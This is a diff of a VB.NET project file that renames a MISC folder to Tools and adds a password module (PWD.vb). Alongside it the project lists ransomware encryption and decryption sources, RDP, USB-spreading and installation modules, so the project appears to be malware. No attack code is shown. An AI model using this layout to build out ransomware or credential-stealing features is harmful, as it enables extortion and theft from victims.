@@ -53,6 +53,7 @@
     <Reference Include="System.Drawing" />
     <Reference Include="System.Management" />
     <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.XML" />
   </ItemGroup>
   <ItemGroup>
     <Import Include="Microsoft.VisualBasic" />
@@ -66,10 +67,11 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="Commands.vb" />
-    <Compile Include="MISC\Func.vb" />
+    <Compile Include="Tools\Func.vb" />
     <Compile Include="ID.vb" />
     <Compile Include="Installation.vb" />
     <Compile Include="Main.vb" />
+    <Compile Include="Tools\PWD.vb" />
     <Compile Include="My Project\AssemblyInfo.vb" />
     <Compile Include="My Project\Application.Designer.vb">
       <AutoGen>True</AutoGen>
@@ -87,10 +89,10 @@
     </Compile>
     <Compile Include="Ransomware\Decryption.vb" />
     <Compile Include="Ransomware\Encryption.vb" />
-    <Compile Include="MISC\RDP.vb" />
+    <Compile Include="Tools\RDP.vb" />
     <Compile Include="Settings.vb" />
     <Compile Include="SK.vb" />
-    <Compile Include="MISC\USB_SP.vb" />
+    <Compile Include="Tools\USB_SP.vb" />
   </ItemGroup>
   <ItemGroup>
     <EmbeddedResource Include="My Project\Resources.resx">
